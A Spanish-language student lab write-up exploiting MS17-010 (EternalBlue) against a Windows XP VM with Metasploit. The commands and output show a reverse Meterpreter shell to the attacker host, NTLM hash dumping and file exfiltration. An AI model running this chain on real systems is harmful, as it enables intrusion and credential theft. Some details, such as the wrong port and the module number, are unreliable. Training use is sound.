# Notas y resultados sobre el  Objetivo 2

Dada la maquina virtual de pruebas indicada por el docente:
- 1 - Generar un informe de vulnerabilidades
  - A. Version del sistema operativo
  - B. Servicios expuestos por el sistema operativo (puerto, protocolo y versión)
  - C. Identificar componentes con vulnerabilidades conocidas
  - D. Determinar si hay exploits conocidos para las vulnerabilidades encontradas.
- 2 - Sustraer de la máquina objetivo
  - A. Lista de usuarios del sistema
  - B. El archivo de texto flag.txt ubicado en el escritorio
  - C. Identificar y decodificar el hash contenido en el archivo del punto anterior


### Antes que nada verificamos cual es nuestra IP de la máquina atacante.

```
┌──(kali㉿kali)-[~]
└─$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::23f4:131c:c7a5:6db3  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:22:46:4f  txqueuelen 1000  (Ethernet)
        RX packets 4011  bytes 3257847 (3.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3651  bytes 410005 (400.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 240 (240.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Ahora sabemos que es 192.168.1.11.
### Hacemos un scaneo en nuestra re local ( -l )

```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l    
Interface: eth0, type: EN10MB, MAC: 08:00:27:22:46:4f, IPv4: 192.168.1.11
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     dc:d9:ae:88:ae:90       (Unknown)
192.168.1.7     20:e9:17:0c:e7:1d       (Unknown)
192.168.1.4     5c:b1:3e:cb:45:07       Sagemcom Broadband SAS
192.168.1.2     cc:6e:a4:49:d3:4f       Samsung Electronics Co.,Ltd
192.168.1.15    08:00:27:a4:82:8c       PCS Systemtechnik GmbH
192.168.1.12    a8:66:7f:30:69:54       Apple, Inc.
192.168.1.9     38:f9:d3:dd:f9:67       Apple, Inc.
192.168.1.6     9c:e0:63:5d:c4:54       Samsung Electronics Co.,Ltd

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 8 responded
```

### Ejecutando nmap -sP sobre cada ip que obtuvimos podemos reconocer rápidamente la que está relacionada o la virtual box con la que levantamos la máquina windows.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sP 192.168.1.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 16:56 EST
Nmap scan report for 192.168.1.15
Host is up (0.00058s latency).
MAC Address: 08:00:27:A4:82:8C (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

### Si sumamos el parámetro -A podremos ver en detalle la versión del sistema operativo.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A 192.168.1.15          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 17:28 EST
Nmap scan report for 192.168.1.15
Host is up (0.00069s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows XP microsoft-ds
5800/tcp open  vnc-http     Ultr@VNC (Name win-xp; resolution: 1182x751; VNC TCP port: 5900)
|_http-title:  [win-xp] 
5900/tcp open  vnc          VNC (protocol 3.6)
MAC Address: 08:00:27:A4:82:8C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows XP
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
OS details: Microsoft Windows XP SP2 or SP3
Network Distance: 1 hop
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 1h30m00s, deviation: 2h07m17s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: WIN-XP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a4:82:8c (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: WIN-XP
|   NetBIOS computer name: WIN-XP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-07T19:28:14-03:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.1.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
```


### Para ver los puertos expuestos y sus posibles vulnerabilidades usamos los parámetros -sV --script vuln

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV --script vuln 192.168.1.15 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 17:30 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.1.15
Host is up (0.00024s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
5800/tcp open  vnc-http     Ultr@VNC (Name win-xp; resolution: 1182x751; VNC TCP port: 5900)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
5900/tcp open  vnc          VNC (protocol 3.6)
MAC Address: 08:00:27:A4:82:8C (Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.66 seconds
```


### Sacamos en limpio que el puerto 5900 expone: 
`Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)`

### Podemos buscar info al respecto de la vulnerabilidad ms17-010.
### Buscando en internet encontramos fácilmente varias manera de explotar esa vulnerabilidad, en este caso es muy conocida.

https://jroliva.net/2017/06/01/explotando-vulnerabilidad-wannacry-o-ms17-010/

https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623

https://hacketcyber.com/a-guide-to-exploiting-ms17-010-with-metasploit/


### También podemos usar el Metaexploit Framework incluido en Kali.
### Lo abrimos y lo primero que podemos hacer es buscar esa misma vulnerabilidad ms17-010 en el sistema de Metaexploit. Con el comando search.

```
msf6 > search ms17-010
                                                                                                                                                                             
Matching Modules                                                                                                                                                             
================                                                                                                                                                             
                                                                                                                                                                             
   #  Name                                      Disclosure Date  Rank     Check  Description                                                                                 
   -  ----                                      ---------------  ----     -----  -----------                                                                                 
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                              
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution    
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution                                                      
                                                                                                                                                                             
                                                                                                                                                                             
Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```


### De esa lista hay que elegir el módulo de exploit que vamos a usar.
### En este caso el primero que logré hacer funcionar fue el 1

`msf6 > use 2`

### Con el módulo seleccionado ahora hay apuntar la IP que vamos a atacar

`msf6 auxiliary(admin/smb/ms17_010_command) > set RHOSTS 192.168.1.15`

### Y ejecutamos el exploit, veremos si funciona

```
msf6 auxiliary(admin/smb/ms17_010_command) > exploit


[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] 192.168.1.15:445 - Target OS: Windows 5.1
[*] 192.168.1.15:445 - Filling barrel with fish... done
[*] 192.168.1.15:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.1.15:445 -  [*] Preparing dynamite...
[*] 192.168.1.15:445 -          [*] Trying stick 1 (x86)...Boom!
[*] 192.168.1.15:445 -  [+] Successfully Leaked Transaction!
[*] 192.168.1.15:445 -  [+] Successfully caught Fish-in-a-barrel
[*] 192.168.1.15:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 192.168.1.15:445 - Reading from CONNECTION struct at: 0x89575800
[*] 192.168.1.15:445 - Built a write-what-where primitive...
[+] 192.168.1.15:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.1.15:445 - Selecting native target
[*] 192.168.1.15:445 - Uploading payload... BOReeVfl.exe
[*] 192.168.1.15:445 - Created \BOReeVfl.exe...
[+] 192.168.1.15:445 - Service started successfully...
[*] 192.168.1.15:445 - Deleting \BOReeVfl.exe...
[*] Sending stage (175686 bytes) to 192.168.1.15
[*] Meterpreter session 1 opened (192.168.1.11:4444 -> 192.168.1.15:1029) at 2022-12-07 18:14:15 -0500

meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > 
```

### Si el exploit funcionó sin necesidad de mayores configuraciones veremos que el prompt de nuestra consola cambió a meterpreter.
### Ahora estamos dentro del meterpreter y podremos correr comandos que impactarán directo a la pc víctima.

### Podemos obtener la lista de usuarios:

```
meterpreter > hashdump
Administrador:500:f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Asistente de ayuda:1000:e81cd034c998302bc15c810e18dbb8ca:82105e8f8bc603d356f7cde70d9ebd28:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Mr.X:1005:552902031bede9efaad3b435b51404ee:878d8014606cda29677a44efa1353fc7:::
server:1004:d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9:::
Spy:1006:b267df22cb945e3eaad3b435b51404ee:36aa83bdcab3c9fdaf321ca42a31c3fc:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:245c86873d34fc0d15385221110197ca:::
Usuario:1003:f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

### Podemos ver los archivos todo lo hay en la víctima. Por ejemplo los archivos txt:

```
meterpreter > search *.txt
Found 376 results...
====================
```


### En nuestro caso podríamos buscar en la lista el archivo flag.txt
### O bien, ya que sabemos el nombre de lo que buscamos lo hacemos específico.


```
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                                                   Size (bytes)  Modified (UTC)
----                                                   ------------  --------------
c:\Documents and Settings\Usuario\Escritorio\flag.txt  20            2021-11-13 17:46:19 -0500
```


### Ahora que encontramos el archivo que nos interesa tenemos que copiarlo hacia nuestra máquina atacante.
###  (hay que scapar ciertos caracteres de la ruta con una \\ )


```
meterpreter > download c:\\Documents\ and\ Settings\\Usuario\\Escritorio\\flag.txt
[*] Downloading: c:\Documents and Settings\Usuario\Escritorio\flag.txt -> /home/kali/flag.txt
[*] skipped    : c:\Documents and Settings\Usuario\Escritorio\flag.txt -> /home/kali/flag.txt
```

### Podemos abrir otro terminal y ver si el archivo se copió

```
┌──(kali㉿kali)-[~]
└─$ ll
total 91180
drwxr-xr-x 2 kali kali     4096 Dec  7 18:19 Desktop
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Documents
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Downloads
-rw-r--r-- 1 kali kali       20 Nov 13  2021 flag.txt <=====================================
drwxr-xr-x 4 kali kali     4096 Dec  5 22:42 hashid
-rw-r--r-- 1 kali kali       20 Dec  5 22:48 hash.txt
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Music
drwxr-xr-x 2 kali kali     4096 Dec  5 10:21 Pictures
-rw-r--r-- 1 kali kali        0 Nov 30 21:58 port80.txt
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Public
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Templates
drwxr-xr-x 2 kali kali     4096 Nov 23 18:27 Videos
```

### Vemos que tiene dentro:

```
└─$ cat flag.txt 
SGE0Y2tfVGgxc19CMFgh   
```

### Luego de buscar varias herramientas que no lograron reconocer el tipo de hash, encontré el site https://hashes.com/ donde copiando y pegando nuestro hash nos dió el siguiente resultado: 

```
SGE0Y2tfVGgxc19CMFgh: Ha4ck_Th1s_B0X!
Possible algorithms: Base64 Encoded String
```
